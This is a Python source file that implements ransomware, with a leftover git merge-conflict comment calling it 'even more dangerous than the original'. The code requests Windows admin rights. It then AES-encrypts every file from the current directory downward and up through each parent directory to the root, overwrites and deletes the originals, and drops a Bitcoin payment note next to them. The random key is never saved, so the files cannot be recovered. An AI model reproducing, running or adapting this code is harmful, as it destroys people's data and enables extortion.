import os
import sys
import random
import ctypes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

<<<<<<< Updated upstream
# WARNING!! THIS VERSION IS EVEN MORE DANGEROUS THAN THE ORGINAL!

=======
>>>>>>> Stashed changes
# Generate a random key and IV
def generate_key_and_iv():
    key = os.urandom(32) # 256-bit key (32 bytes) for AES encryption
    iv = os.urandom(16) # 128-bit IV (16 bytes)
    return key, iv
    
# Function to create a placeholder BTC address file
def create_btc_address_file(directory):
    btc_address = "Pay BTC here: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"  # Example BTC address
    btc_file_path = os.path.join(directory, "BTC_Payment_Info.txt")

    # Write the BTC address to the text file
    with open(btc_file_path, 'w') as btc_file:
        btc_file.write(btc_address)

# Secure file deletion (overwrite and remove)
def secure_delete(file_path, passes=8):
    with open(file_path, 'r+b') as f:
        length = os.path.getsize(file_path)
        for _ in range(passes):
            f.seek(0)
            f.write(bytearray(random.getrandbits(4) for _ in range(length)))
    os.remove(file_path)
    
    # Debugging
    #print(f"File {file_path} has been securely deleted.")

# Encrypt a file
def encrypt_file(file_path, key, iv):
    with open(file_path, 'rb') as f:
        data = f.read()
        
    # Padding to ensure the data is a multiple of block size (128 bits = 16 bytes)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Create AES Cipher with CBC mode and ecnrypt the data
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Add '.enc' extension to the encrypted file. Then save and replace files with encrypted data
    encrypted_file_path = file_path + '.enc'
    with open(encrypted_file_path, 'wb') as enc_file:
        enc_file.write(encrypted_data)
    secure_delete(file_path)
    create_btc_address_file(os.path.dirname(file_path))
        
        # Debugging
        # print(f"Original file {file_path} has been encrypted and deleted. Encrypted version is saved as {encrypted_file_path}")

    # Create BTC address files in current folder
    # x = 0
    # while x < 10:
    if os.path.exists(os.path.dirname(file_path)):
        create_btc_address_file(os.path.dirname(file_path))
        # x += 1

# Recursively encrypt files
def encrypt_files_recursively(directory, key, iv, script_path):
    for root, dirs, files in os.walk(directory, topdown=True):
        for filename in files:
            file_path = os.path.join(root, filename)

            # Skip encrypting the script itself
            if file_path == script_path:
                continue

            if os.path.isfile(file_path):
                try:
                    encrypt_file(file_path, key, iv)
                except Exception as e:
                    print(f"Failed to encrypt {file_path}: {e}")

            # Skip encryption for main.py
            # if filename == "main_v2.py" or filename == "main.spec" or filename == "main.exe":
            #     continue

# Encrypt files in parent directories
def encrypt_files_upwards(directory, key, iv, script_path):
    while directory:
        for root, _, files in os.walk(directory):
            for filename in files:
                file_path = os.path.join(root, filename)

                # Skip encrypting the script itself
                if file_path == script_path:
                    continue

                if os.path.isfile(file_path):
                    try:
                        encrypt_file(file_path, key, iv)
                    except Exception as e:
                        print(f"Failed to encrypt {file_path}: {e}")

        # Move up to the parent directory
        parent_directory = os.path.abspath(os.path.join(directory, os.pardir))
        if parent_directory == directory: # if already at root
            break
        directory = parent_directory

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Main function to execute the program
if __name__ == "__main__":
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{sys.argv[0]}"', None, 1
        )
        sys.exit(0)

    current_directory = os.getcwd()  # Get the current working directory
    script_path = os.path.realpath(__file__) # Full path to this script

    key, iv = generate_key_and_iv()
    encrypt_files_recursively(current_directory, key, iv, script_path)
    encrypt_files_upwards(current_directory, key, iv, script_path)
    print("All accessible files have been encrypted!")
